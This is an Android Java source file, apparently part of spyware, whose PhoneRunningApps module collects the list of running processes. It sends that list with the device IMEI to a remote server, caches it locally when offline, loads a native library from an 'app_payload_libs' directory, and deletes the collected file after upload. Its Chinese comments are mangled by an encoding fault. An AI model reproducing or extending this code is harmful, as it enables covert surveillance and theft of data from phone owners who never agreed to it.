package com.phone.data;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.WriteDateFile;


public class PhoneRunningApps implements Runnable{
	
	private static String SHELL_LIB_PATH = "app_payload_libs";
	private Context context;
	private static String TAG = "PhoneRunningApps";
	
	public PhoneRunningApps(Context context){
		this.context = context;
	}
	
	
	public static String getRunningAppsJava(Context context){
		JSONArray jsarrayrun=new JSONArray();
		try {
			ActivityManager am = (ActivityManager)context.getSystemService("activity");
			List<RunningAppProcessInfo> runapplist = am.getRunningAppProcesses();

			int runappcnt = 0;
			
			for (RunningAppProcessInfo runapp : runapplist) {
				/*
				runappinfo = runappinfo + "��������:" + runapp.processName  + "\t����ID:" + String.valueOf(runapp.pid) + 
						"\t�û�ID:" + String.valueOf(runapp.uid) + "\tLRU:" + String.valueOf(runapp.lru) + 
						"\t����:"+ String.valueOf(runapp.describeContents()) +  "\r\n";
						*/
				
				JSONObject jsobj=new JSONObject();
    	   	  	jsobj.put("��������", runapp.processName);
    	   	  	jsobj.put("����ID",String.valueOf(runapp.pid));
    	   	  	jsobj.put("�û�ID", String.valueOf(runapp.uid));
    	   	  	jsobj.put("LRU", String.valueOf(runapp.lru));
    	   	  	jsobj.put("����", String.valueOf(runapp.describeContents()));
		   	  	jsarrayrun.put(runappcnt,jsobj);
		   	  	runappcnt++;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return jsarrayrun.toString();
	}
	
	public static void getRunningApps(Context context){
		try {
			boolean cpu64 = false;

            String mProcessor = getFieldFromCpuinfo("Processor");
            if (mProcessor.contains("aarch64")) {
            	cpu64 = true;
            }

			
			String value = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName,
					ForegroundService.SETUPMODE);
			if ( (value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)) ||
					Build.VERSION.SDK_INT >= 14 || cpu64 == true){	//24
				
				String appprocss = getRunningAppsJava(context);
		    	if(appprocss != null && appprocss.equals("") == false ){
			    	if (Network.isNetworkConnected(context) == false) {
			    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
			    				ForegroundService.RUNNINGAPPS_FILE_NAME, appprocss,false);
					}else{
						SendDataToServer.sendDataToServer(appprocss.getBytes(), appprocss.getBytes().length,
								Public.CMD_DATA_RUNNINGAPPS, Public.IMEI);
					}
				}
				return;
			}
			
			//AndroidRuntime: java.lang.UnsatisfiedLinkError: 
			//No implementation found for int com.phone.data.w.howareyou(java.lang.String) 
			//(tried Java_com_phone_data_w_howareyou and Java_com_phone_data_w_howareyou__Ljava_lang_String_2)

			//1 ���ص�·����ͬ��System.load(String filename) �Ǵ���Ϊ��̬��ı����ļ�ϵͳ����ָ�����ļ������ش����ļ���
			//�ļ�������������������·�����Ҵ��ļ���׺��
			//�� System.loadLibrary(String libname) �Ǽ����� libname ����ָ����ϵͳ�⣨ϵͳ��ָ���� java.library.path��
			//����ͨ�� System.getProperty(String key) �����鿴 java.library.path ָ���Ŀ¼���ݣ���
			//������ӳ�䵽ʵ��ϵͳ��ķ���ȡ����ϵͳʵ�֣�
			//Ʃ���� Android ƽ̨ϵͳ���Զ�ȥϵͳĿ¼��Ӧ�� lib Ŀ¼��ȥ�� libname ����ƴ���� lib ǰ׺�Ŀ��ļ���
			//2 �Ƿ��Զ����ؿ�������⣺Ʃ�� libA.so �� libB.so ��������ϵ��
			//���ѡ�� System.load("/sdcard/path/libA.so")����ʹ libB.so Ҳ���� /sdcard/path/ ·���£�
			//load �������ǻ���Ϊ�Ҳ��������� libB.so �ļ���ʧ�ܣ���Ϊ����������� libA.so ��ʱ������������ libB.so��
			//��ô����ȥ java.library.path ������ libB.so���� libB.so ����λ�� java.library.path �£����Իᱨ��
			//����ķ��������� System.load("/sdcard/path/libB.so") �� System.load("/sdcard/path/libA.so")��
			//�������ַ�ʽ��̫���ף���Ϊ������ȷ֪��������ϵ��
			//��һ�ֽ����������ʹ�� System.loadLibrary("A")��Ȼ��� libA.so �� libB.so ������ java.library.path �¼��ɡ�

			String sofilepath = context.getFilesDir().getParent() + "/" + SHELL_LIB_PATH + "/";
			File sopathFile = new File(sofilepath);
			if (sopathFile.exists() == true) {
				Log.e(TAG, "System.load:" + sofilepath + "libRunningApps.so");
				System.load(sofilepath + "libRunningApps.so");
				
			}else{
				Log.e(TAG, "System.loadLibrary RunningApps");
				//System.load("libRunningApps.so");
				System.loadLibrary("RunningApps");
				
			}
			
			String dstfn = ForegroundService.LOCAL_PATH_NAME + ForegroundService.RUNNINGAPPS_FILE_NAME;
			int ret  = procRunningApps(dstfn);
			if (ret == 0) {
				
				File file = new File(dstfn);
				if (file.exists() ) {
//					String filename = ForegroundService.RUNNINGAPPS_FILE_NAME;
//					int filenamelen = filename.getBytes().length;
					int filesize = (int)file.length();
					//int sendsize = filesize + 4 + filenamelen + 4;
					int sendsize = filesize;
					byte[] sendbuf = new byte[sendsize];
//					byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
//					System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
//					System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
//					byte[] bytefilesize = PublicFunction.intToBytes(filesize);
//					System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
					
		    		FileInputStream fin = new FileInputStream(file);
		    		//fin.read(sendbuf,4 + filenamelen + 4,filesize);
		    		fin.read(sendbuf,0,filesize);
		    		fin.close();
		    		
		    		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_RUNNINGAPPS, Public.IMEI);
		    		WriteDateFile.writeLogFile("find runningapps file:" + file.getName() + "\r\n");
		    		file.delete();
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void run(){
		getRunningApps(context);

	}
	
	@SuppressWarnings("resource")
	public static String getFieldFromCpuinfo(String field) throws IOException {
		BufferedReader br = null;
		try {
	        
	        br = new BufferedReader(new FileReader("/proc/cpuinfo"));
	        Pattern p = Pattern.compile(field + "\\s*:\\s*(.*)");
       
            String line;
            while ((line = br.readLine()) != null) {
                Matcher m = p.matcher(line);
                if (m.matches()) {
                    return m.group(1);
                }
            }
        } catch(Exception ex) {
        	ex.printStackTrace();
        	if(br != null){
        		br.close();
        	}
        }

        return "";
    }
	
	
	public static native int procRunningApps(String dstfn);

}


